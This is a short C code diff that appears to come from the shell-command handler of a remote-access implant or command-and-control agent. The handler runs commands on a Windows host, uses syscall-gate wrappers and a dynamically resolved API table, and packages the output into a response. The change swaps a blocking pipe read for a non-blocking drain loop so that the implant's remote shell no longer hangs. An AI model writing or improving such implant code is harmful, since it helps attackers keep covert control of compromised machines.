@@ -52,11 +52,27 @@ VOID cmd_shell(PINSTANCE inst, PPARSER args, PPACKAGE response) {
 
     gate_WaitForSingleObject(inst, pi.hProcess, 30000);
 
+    // Non-blocking drain: blocking ReadFile here hangs forever if conhost
+    // (spawned for the child console) inherits the write handle and outlives
+    // cmd.exe.
     BYTE read_buf[4096];
     DWORD read_bytes;
-    while (inst->Win32.ReadFile(hReadPipe, read_buf, sizeof(read_buf) - 1, &read_bytes, NULL) && read_bytes > 0) {
-        read_buf[read_bytes] = 0;
-        package_add_bytes(inst, response, read_buf, read_bytes);
+    DWORD waited = 0;
+    while (waited < 60000) {
+        DWORD avail = 0;
+        if (!inst->Win32.PeekNamedPipe(hReadPipe, NULL, 0, NULL, &avail, NULL))
+            break;
+        if (avail > 0) {
+            if (!inst->Win32.ReadFile(hReadPipe, read_buf, sizeof(read_buf), &read_bytes, NULL) || read_bytes == 0)
+                break;
+            read_buf[read_bytes] = 0;
+            package_add_bytes(inst, response, read_buf, read_bytes);
+        } else {
+            if (gate_WaitForSingleObject(inst, pi.hProcess, 0) != 0x102 /*WAIT_TIMEOUT*/)
+                break;
+            inst->Win32.Sleep(50);
+            waited += 50;
+        }
     }
 
     gate_CloseHandle(inst, pi.hProcess);
